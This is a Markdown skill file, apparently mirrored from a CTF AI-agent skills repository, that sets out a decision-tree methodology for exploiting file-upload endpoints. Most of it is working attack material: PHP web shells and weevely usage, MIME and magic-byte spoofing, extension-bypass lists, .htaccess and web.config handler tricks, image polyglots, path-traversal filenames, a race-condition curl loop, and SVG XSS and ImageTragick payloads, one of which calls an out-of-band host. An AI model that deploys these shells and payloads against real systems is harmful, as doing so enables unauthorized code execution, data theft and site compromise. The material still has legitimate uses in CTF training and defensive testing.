# File Upload Vulnerabilities

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/file-upload.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/file-upload.md)

---

---
name: file-upload
category: web
triggers: [upload, "file upload", "profile picture", avatar, "image upload", multipart, "content-type", "magic bytes", webshell, "web shell", polyglot, ".htaccess", "double extension", "shell.php", "upload avatar", attachment, imagetragick, "svg upload"]
tools: [burp, curl, exiftool, weevely, "fuzzdb", "upload_bypass"]
priority: high
description: Bypass upload filters (extension/MIME/magic byte) to plant web shells, polyglots, and pivot via path traversal and race conditions.
---
# File Upload Vulnerabilities

## Trigger context
- Any endpoint accepting files: avatars, attachments, import/CSV, image processors, document converters, resume upload.
- Signals: `multipart/form-data`, `filename=` in request, uploaded file retrievable at a predictable URL, image thumbnailing (ImageMagick/GD).
- First determine: (a) what's validated (extension / MIME / magic bytes / content), (b) where files land, (c) whether that dir executes code.

## Objective
Upload an executable web shell for RCE. Secondary: XSS/SVG (see [xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md) for SVG-XXE), path traversal to overwrite files, SSRF via URL-import, ImageTragick/pixel-flood, or DoS.

## Methodology (decision tree)
1. Baseline: upload a plain shell (`shell.php`) — if it executes, done.
2. Blocked → identify the filter layer(s): change only the extension, only the `Content-Type`, only the magic bytes, one at a time, to see which each rejects.
3. Find the upload location + whether it runs code: retrieve your file, check the response and whether `.php`/`.jsp`/`.asp` executes there.
4. Apply the matching bypass from Branching logic.
5. If no server-side exec is possible → pivot: `.htaccess`/`web.config` to enable exec, SVG/HTML for stored XSS, filename path traversal to write outside the dir, or client-side-only validation (drop it in Burp).
6. Confirm RCE and read the flag.

## Commands & payloads
```bash
# Minimal PHP web shell
echo '<?php system($_GET["c"]); ?>' > shell.php
# Then: curl 'http://T/uploads/shell.php?c=id'
# Fuller shells: weevely generate <pass> shell.php ; then weevely http://T/uploads/shell.php <pass>
```
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          <-- MIME spoof

GIF89a;                            <-- magic-byte prefix (valid GIF header)
<?php system($_GET['c']); ?>
--X--
```
```bash
# Extension variants to fuzz when .php is blocked:
shell.php3 shell.php4 shell.php5 shell.php7 shell.phtml shell.pht shell.phar shell.phps
shell.PHP shell.pHp                      # case
shell.php.jpg shell.jpg.php              # double extension
shell.php%00.jpg  shell.php\x00.jpg      # null byte (legacy)
shell.php%20 shell.php. shell.php...     # trailing space/dot (Windows/IIS trims)
shell.php:.jpg  shell.php;.jpg           # NTFS ADS / IIS6 semicolon
# ASP/JSP/etc: .asp .aspx .asa .cer .jsp .jspx .war
```
```apache
# .htaccess trick — upload this, then any .xyz file executes as PHP
AddType application/x-httpd-php .xyz
# or:  AddHandler application/x-httpd-php .jpg
```
```xml
<!-- web.config trick (IIS/.NET) uploaded to a dir to enable ASP/handler exec -->
<configuration><system.webServer><handlers>
  <add name="x" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="..."/>
</handlers></system.webServer></configuration>
```
```bash
# Polyglot: real image + PHP appended, keeps magic bytes AND valid image
exiftool -Comment='<?php system($_GET["c"]); ?>' clean.jpg -o poly.php.jpg
# or append after image data:  cat clean.png shell.php > poly.php
# Path traversal in filename (write outside upload dir):
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2f..%2fshell.php"
```

```bash
# Race condition: upload then hammer the temp path before the validator deletes/moves it
for i in $(seq 1 5000); do curl -s "http://T/tmp/shell.php?c=id" & done   # access loop
# (run concurrently with a tight upload loop of shell.php; catch the exec window)
```
```
# SVG stored-XSS payload (when only images allowed but SVG is served inline):
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
# ImageTragick (ImageMagick <7.0.1-1) via MSL polyglot .svg/.mvg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://x/x.jpg"|curl OAST)'
pop graphic-context
```
```
# Magic bytes to prepend (keep as first bytes, code after):
GIF87a / GIF89a   image/gif
\xFF\xD8\xFF\xE0   image/jpeg (JFIF)
\x89PNG\r\n\x1a\n  image/png
%PDF-1.4          application/pdf   (PDF+PHP polyglot)
```

## Branching logic
- **Extension blocklist** → alt PHP extensions (`.phtml`,`.php5`,`.pht`,`.phar`), double ext, case, trailing dot/space, null byte (legacy).
- **Extension allowlist (only images)** → `.htaccess`/`web.config` to remap; SVG (XSS/XXE); polyglot if the retrieved file is also served as PHP; or find a second endpoint with weaker checks.
- **MIME/Content-Type check** → set `Content-Type: image/png` in the multipart part while keeping `.php` filename.
- **Magic-byte / `getimagesize` check** → prepend `GIF89a;` or `\xFF\xD8\xFF` (JPEG) / `\x89PNG` before the PHP; or use a real image polyglot.
- **Image re-encoding/resizing (GD/ImageMagick strips payload)** → embed in EXIF (survives some ops), use ImageTragick (`MSL`/`ephemeral:`) or pixel-flood/SVG for the actual exploit; a raw shell won't survive re-encode.
- **Random filename assigned** → need path traversal to control name, or a listing/predictable-path leak; else pivot to XSS/SVG.
- **Non-exec upload dir** → traversal to a web-root/exec dir, or `.htaccess` in the same dir.
- **Two-stage validate-then-move** → **race condition**: hammer requests to the temp path while it briefly exists (multi-thread upload + access).
- **URL-based "upload from link"** → this is SSRF: see [ssrf](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssrf.md).

## Common pitfalls
- Confirm the upload dir actually executes PHP before celebrating a 200 — many store to a static/CDN path that serves source as text.
- Null-byte and some double-ext tricks are legacy (old PHP/Apache); don't over-rely on modern targets.
- Re-encoding pipelines destroy naive appended shells — check whether your bytes survive by re-downloading.
- `Content-Type` in the multipart PART matters, not the outer request header.
- `.htaccess` only helps on Apache with `AllowOverride` allowing it; use `web.config` for IIS instead.
- Filename traversal often blocked by basename() server-side — test both encoded and raw slashes.

## Proof / verification
- RCE: `curl http://T/uploads/shell.php?c=id` returns command output; then `?c=cat /flag`.
- Weevely session screenshot / command output.
- Stored XSS: SVG/HTML fires in victim context.
- Overwrite: target file replaced with your content.

## Cross-references
[file-inclusion-lfi-rfi](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-inclusion-lfi-rfi.md) · [insecure-deserialization](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--insecure-deserialization.md) · [ssrf](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssrf.md) · [xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md) · [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md)

## Credible sources
- https://portswigger.net/web-security/file-upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
